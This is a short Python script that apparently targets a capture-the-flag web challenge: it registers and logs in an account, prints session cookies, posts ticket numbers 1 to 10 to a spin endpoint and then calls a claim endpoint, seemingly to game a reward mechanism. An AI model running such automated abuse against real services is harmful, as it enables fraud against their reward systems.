import requests, json, base64, sys
session = requests.Session()
url = 'https://web-random-cheese.tracebash.xyz'
session.post(f'{url}/register', data={'username':'hack31','password':'hack31'})
login = session.post(f'{url}/login', data={'username':'hack31','password':'hack31'})
print('Login cookies:', session.cookies.get_dict())
for i in range(1,11):
    r = session.post(f'{url}/spin', data={'ticket': str(i)})
    print(f'Spin {i}: {r.text}')
r = session.post(f'{url}/claim')
print('Claim:', r.text)